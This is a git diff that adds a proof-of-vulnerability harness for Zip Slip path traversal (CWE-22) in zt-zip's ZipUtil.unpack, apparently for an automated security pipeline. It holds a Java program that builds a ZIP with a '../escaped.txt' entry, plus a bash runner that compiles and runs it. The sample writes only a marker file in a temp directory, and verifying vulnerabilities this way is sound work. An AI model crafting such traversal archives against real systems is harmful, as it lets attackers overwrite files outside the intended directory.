@@ -1,0 +1,129 @@
+diff --git a/.security-pipeline/pov/ZipSlipPoV.java b/.security-pipeline/pov/ZipSlipPoV.java
+new file mode 100644
+index 0000000..f93d721
+--- /dev/null
++++ b/.security-pipeline/pov/ZipSlipPoV.java
+@@ -0,0 +1,77 @@
++package security.pov;
++
++import java.io.File;
++import java.io.FileOutputStream;
++import java.io.OutputStream;
++import java.util.zip.ZipEntry;
++import java.util.zip.ZipOutputStream;
++
++import org.zeroturnaround.zip.ZipUtil;
++
++/**
++ * Proof-of-Vulnerability for CWE-022 (Path Traversal / "Zip Slip") in
++ * org.zeroturnaround.zip.ZipUtil.
++ *
++ * A crafted ZIP whose entry name contains ".." traverses out of the
++ * requested output directory. ZipUtil.unpack() joins the entry name to the
++ * output directory with `new File(outputDir, name)` (ZipUtil.Unpacker.process,
++ * line ~1152) without validating that the resolved path stays inside
++ * outputDir, so the extracted file lands in the PARENT of outputDir.
++ *
++ * Exit 0  => escaped file was written outside outputDir  => VULNERABLE.
++ * Exit 1  => extraction was blocked / rejected            => PATCHED.
++ */
++public class ZipSlipPoV {
++
++  public static void main(String[] args) throws Exception {
++    File base = File.createTempFile("zipslip-pov", "");
++    base.delete();
++    base.mkdirs();
++
++    File outputDir = new File(base, "out");
++    outputDir.mkdirs();
++
++    // Target lives in the PARENT of outputDir; a safe extractor can never
++    // create it because "../escaped.txt" must not escape outputDir.
++    File escaped = new File(base, "escaped.txt");
++    if (escaped.exists()) {
++      escaped.delete();
++    }
++
++    // Build a malicious ZIP with a traversal entry name.
++    File zip = new File(base, "malicious.zip");
++    String maliciousEntry = "../escaped.txt";
++    ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zip));
++    try {
++      zos.putNextEntry(new ZipEntry(maliciousEntry));
++      zos.write("owned-by-zip-slip".getBytes("UTF-8"));
++      zos.closeEntry();
++    } finally {
++      zos.close();
++    }
++
++    System.out.println("[pov] outputDir = " + outputDir.getCanonicalPath());
++    System.out.println("[pov] malicious entry = " + maliciousEntry);
++
++    boolean threw = false;
++    try {
++      // Exercise the real vulnerable project code through its public API.
++      ZipUtil.unpack(zip, outputDir);
++    } catch (Throwable t) {
++      threw = true;
++      System.out.println("[pov] unpack rejected the archive: " + t);
++    }
++
++    boolean escapedWritten = escaped.exists()
++        && escaped.getCanonicalPath().equals(new File(base, "escaped.txt").getCanonicalPath());
++
++    if (escapedWritten) {
++      System.out.println("[pov] VULNERABLE: file written outside outputDir at "
++          + escaped.getCanonicalPath());
++      System.exit(0);
++    }
++
++    System.out.println("[pov] SAFE: no file escaped outputDir (threw=" + threw + ")");
++    System.exit(1);
++  }
++}
+diff --git a/.security-pipeline/pov/classes/security/pov/ZipSlipPoV.class b/.security-pipeline/pov/classes/security/pov/ZipSlipPoV.class
+new file mode 100644
+index 0000000..dbdd762
+Binary files /dev/null and b/.security-pipeline/pov/classes/security/pov/ZipSlipPoV.class differ
+diff --git a/.security-pipeline/pov/cp.txt b/.security-pipeline/pov/cp.txt
+new file mode 100644
+index 0000000..afb5cc9
+--- /dev/null
++++ b/.security-pipeline/pov/cp.txt
+@@ -0,0 +1 @@
++/root/.m2/repository/org/slf4j/slf4j-api/1.6.6/slf4j-api-1.6.6.jar:/root/.m2/repository/junit/junit/4.12/junit-4.12.jar:/root/.m2/repository/org/hamcrest/hamcrest-core/1.3/hamcrest-core-1.3.jar:/root/.m2/repository/org/slf4j/slf4j-log4j12/1.6.6/slf4j-log4j12-1.6.6.jar:/root/.m2/repository/log4j/log4j/1.2.16/log4j-1.2.16.jar
+\ No newline at end of file
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100755
+index 0000000..8681ffd
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,28 @@
++#!/usr/bin/env bash
++# Zip Slip (CWE-022) Proof-of-Vulnerability runner for zt-zip ZipUtil.
++# Exit 0 => vulnerable (file escaped output dir). Exit non-zero => patched.
++set -eu
++
++POV_DIR="$(cd "$(dirname "$0")" && pwd)"
++REPO_DIR="$(cd "$POV_DIR/../.." && pwd)"
++cd "$REPO_DIR"
++
++# Ensure the project classes are built (uses the real project code).
++if [ ! -d target/classes ]; then
++  mvn -B -q -DskipTests package
++fi
++
++OUT="$POV_DIR/classes"
++rm -rf "$OUT"
++mkdir -p "$OUT"
++
++# Resolve the project's runtime dependencies (slf4j, commons, etc.).
++CP_FILE="$POV_DIR/cp.txt"
++mvn -B -q dependency:build-classpath -Dmdep.outputFile="$CP_FILE" >/dev/null 2>&1 || true
++DEPS=""
++if [ -s "$CP_FILE" ]; then
++  DEPS=":$(cat "$CP_FILE")"
++fi
++
++javac -cp "target/classes$DEPS" -d "$OUT" "$POV_DIR/ZipSlipPoV.java"
++java -cp "$OUT:target/classes$DEPS" security.pov.ZipSlipPoV
